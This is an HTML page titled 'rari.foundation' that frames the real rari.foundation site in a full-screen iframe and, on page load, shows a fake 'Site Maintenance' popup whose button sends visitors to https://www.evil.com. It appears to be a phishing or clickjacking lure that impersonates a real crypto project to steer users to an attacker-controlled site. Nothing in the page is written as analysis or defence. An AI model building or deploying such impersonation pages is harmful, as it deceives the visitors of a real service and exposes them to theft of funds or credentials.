<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>rari.foundation</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f4;
        }
        #popup-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 400px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            display: none;
            z-index: 1000;
        }
        #popup-content {
            padding: 20px;
            text-align: center;
        }
        #donate-button {
            display: inline-block;
            padding: 15px 30px;
            font-size: 18px;
            background-color: #3498db;
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        #donate-button:hover {
            background-color: #217dbb;
        }
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.6;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="popup-container">
        <div id="popup-content">
            <h2>Site Maintenance</h2>
            <p>We apologize for the inconvenience, but the site is currently undergoing maintenance.</p>
            <a href="https://www.evil.com" id="donate-button" target="_blank">Redirect</a>
        </div>
    </div>
    <iframe src="https://rari.foundation/"></iframe>
    <script>
        // Function to show the popup
        function showPopup() {
            document.getElementById('popup-container').style.display = 'block';
        }

        // Show the popup when the user visits the site
        window.onload = showPopup;
    </script>
</body>
</html>
